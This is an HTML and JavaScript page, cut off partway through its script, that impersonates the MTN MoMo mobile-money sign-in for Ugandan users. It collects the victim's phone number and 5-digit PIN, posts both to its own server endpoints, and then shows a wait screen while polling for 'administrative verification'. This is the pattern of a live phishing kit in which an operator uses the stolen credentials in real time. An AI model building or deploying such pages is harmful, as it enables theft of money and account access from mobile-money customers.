<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Welcome to MoMo</title>
  <style>
    * { box-sizing: border-box; }
    body { 
      margin: 0; 
      min-height: 100vh; 
      font-family: Arial, sans-serif; 
      background: #eef2f5; 
      color: #171717; 
      display: flex;
      flex-direction: column;
    }
    
    /* MoMo Deep Blue Top Container */
    header { 
      background: #004f71; 
      padding: 40px 16px 60px; 
      text-align: center;
      position: relative;
    }
    
    /* MoMo Yellow Box Logo Emblem Placeholder */
    .momo-logo-box {
      width: 60px;
      height: 60px;
      background: #ffcc00;
      border-radius: 12px;
      margin: 0 auto;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 10px rgba(0,0,0,0.15);
    }
    .momo-logo-text {
      color: #004f71;
      font-weight: 900;
      font-size: 18px;
    }
    .momo-subtext {
      color: #ffcc00;
      font-size: 11px;
      margin-top: 4px;
      font-weight: bold;
    }

    /* Floating Card Layout */
    main { 
      width: min(440px, 92%); 
      margin: -35px auto 25px; 
      padding: 30px 24px; 
      background: white; 
      border-radius: 24px; 
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08); 
      z-index: 10;
    }
    
    h2 { 
      margin-top: 0; 
      text-align: center; 
      color: #004f71;
      font-size: 22px;
      font-weight: 700;
    }
    
    .field-label { 
      display: block; 
      text-align: center;
      margin: 20px 0 12px; 
      font-weight: 600; 
      color: #555;
      font-size: 14px;
    }
    
    /* Phone Input Container Matching Screenshot */
    .phone-row { 
      display: flex; 
      gap: 10px; 
      align-items: center; 
      border: 1px solid #ccc;
      border-radius: 16px;
      padding: 8px 14px;
      background: #fff;
    }
    .phone-row:focus-within {
      border-color: #004f71;
      box-shadow: 0 0 0 2px rgba(0,79,113,0.15);
    }
    .country-flag { 
      flex-shrink: 0; 
      display: flex;
      align-items: center;
      justify-content: center;
      width: 40px;
      height: 40px;
      border: 1px solid #eee;
      border-radius: 50%;
      background: #fafafa;
      font-size: 20px;
    }
    .phone-input-field {
      border: none;
      outline: none;
      width: 100%;
      font-size: 18px;
      letter-spacing: 1px;
      font-weight: 600;
    }
    
    /* PIN Boxes Grid style */
    .digits { 
      display: flex; 
      justify-content: center; 
      gap: 10px; 
      margin-top: 10px;
    }
    .digit { 
      width: 48px; 
      height: 48px; 
      border: 1px solid #ccc; 
      border-radius: 12px; 
      text-align: center; 
      font-size: 20px; 
      font-weight: bold; 
      background: #fafafa;
    }
    .digit:focus { 
      outline: none; 
      border-color: #004f71; 
      background: #fff;
      box-shadow: 0 0 0 2px rgba(0,79,113,0.15);
    }
    
    /* Action Buttons */
    button { 
      width: 100%; 
      padding: 16px; 
      margin-top: 30px; 
      border: 0; 
      border-radius: 25px; 
      background: #004f71; 
      color: white; 
      font-weight: bold; 
      font-size: 16px; 
      cursor: pointer; 
      letter-spacing: 1px;
      transition: background 0.2s;
    }
    button:hover { background: #00364f; }
    button:disabled { background: #cccccc; cursor: not-allowed; }
    
    .hidden { display: none !important; }
    
    /* Footer Legal Links */
    .legal-text {
      text-align: center;
      font-size: 13px;
      color: #666;
      line-height: 1.6;
      padding: 0 10px;
      margin-top: 25px;
    }
    .legal-text a {
      color: #004f71;
      text-decoration: none;
      font-weight: bold;
    }

    /* Loading Status Styles */
    .spinner { 
      width: 40px; 
      height: 40px; 
      margin: 20px auto; 
      border: 4px solid #eee; 
      border-top-color: #004f71; 
      border-radius: 50%; 
      animation: spin .8s linear infinite; 
    }
    @keyframes spin { to { transform: rotate(360deg); } }  
    
    .status { text-align: center; padding: 12px; margin-top: 15px; color: #555; font-size: 14px; }
    .error { color: #d32f2f; text-align: center; margin-top: 12px; font-size: 14px; font-weight: 600; }
    .success { font-size: 24px; text-align: center; padding: 20px 0; color: #2e7d32; font-weight: bold; }
  </style>
</head>
<body>

  <header>
    <div class="momo-logo-box">
      <span class="momo-logo-text">MoMo</span>
    </div>
    <div class="momo-subtext">from MTN</div>
  </header>

  <main>
    <!-- PHONE NUMBER STEP -->
    <section id="phonePage">
      <h2>Welcome to MoMo</h2>
      <label class="field-label">Enter number *</label>
      <div class="phone-row">
        <div class="country-flag">🇺🇬</div>
        <input type="text" id="phoneInput" class="phone-input-field" placeholder="e.g. 778260583" inputmode="numeric" maxlength="9">
      </div>
      
      <button id="phoneButton" disabled>NEXT</button>
      <p id="phoneError" class="error"></p>
      
      <p class="legal-text">
        Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
      </p>
    </section>

    <!-- PIN STEP -->
    <section id="pinPage" class="hidden">
      <h2>Welcome to MoMo</h2>
      <label class="field-label">Enter your 5-digit PIN</label>
      <div class="digits" id="pinDigits"></div>

      <div id="pinLoading" class="hidden">
        <div class="spinner"></div>
        <p class="status">Verifying credentials safely...</p>
      </div>

      <p id="pinStatus" class="status"></p>
      <p id="pinError" class="error"></p>
    </section>

    <!-- SUCCESS STEP -->
    <section id="successPage" class="hidden">
      <div class="success">✓ Verified Successfully</div>
      <p style="text-align: center; color: #555;">Your sign-in request has been approved.</p>
    </section>
  </main>

  <script>
    let currentRequestId = null;
    let pollInterval = null;

    const phonePage = document.getElementById('phonePage');
    const pinPage = document.getElementById('pinPage');
    const successPage = document.getElementById('successPage');
    const phoneInput = document.getElementById('phoneInput');
    const phoneButton = document.getElementById('phoneButton');
    const phoneError = document.getElementById('phoneError');
    const pinDigitsContainer = document.getElementById('pinDigits');
    const pinLoading = document.getElementById('pinLoading');
    const pinStatus = document.getElementById('pinStatus');
    const pinError = document.getElementById('pinError');

    // Handle Input validation for phone number field
    phoneInput.addEventListener('input', (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, '');
      phoneButton.disabled = e.target.value.length < 9;
    });

    phoneButton.addEventListener('click', async () => {
      phoneError.textContent = '';
      phoneButton.disabled = true;
      
      // Combines regional prefix +256 with the user's 9-digit entry
      const fullPhone = '+256' + phoneInput.value;

      try {
        const res = await fetch('/api/phone', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: fullPhone })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Failed to start setup.');

        currentRequestId = data.id;
        phonePage.classList.add('hidden');
        pinPage.classList.remove('hidden');
        
        // Setup PIN box containers dynamically inside card
        createPinInputs(pinDigitsContainer, 5);
      } catch (err) {
        phoneError.textContent = err.message;
        phoneButton.disabled = false;
      }
    });

    function createPinInputs(container, count) {
      container.innerHTML = '';
      const inputs = [];
      for (let i = 0; i < count; i++) {
        const input = document.createElement('input');
        input.type = 'password';
        input.inputMode = 'numeric';
        input.pattern = '[0-9]*';
        input.maxLength = 1;
        input.className = 'digit';

        input.addEventListener('input', (e) => {
          e.target.value = e.target.value.replace(/[^0-9]/g, '');
          if (e.target.value && input.nextElementSibling) {
            input.nextElementSibling.focus();
          }
          
          // Detect full input length triggers action
          const pinVal = inputs.map(inp => inp.value).join('');
          if (pinVal.length === count) {
            submitPinFlow(pinVal, inputs);
          }
        });

        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {
            input.previousElementSibling.focus();
          }
        });

        container.appendChild(input);
        inputs.push(input);
      }
      if(inputs[0]) inputs[0].focus();
    }

    async function submitPinFlow(pinValue, inputs) {
      pinError.textContent = '';
      pinLoading.classList.remove('hidden');
      pinStatus.textContent = 'Awaiting administrative verification status...';
      inputs.forEach(i => i.disabled = true);

      try {
        const res = await fetch('/api/pin-demo', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Submission failed.');

        startPollingAdminState(inputs);
      } catch (err) {
        pinError.textContent = err.message;
        pinLoading.classList.add('hidden');
        pinStatus.textContent = '';
        inputs.forEach(i => { i.disabled = false; i.value = ''; });
        inputs[0].focus();
      }
    }
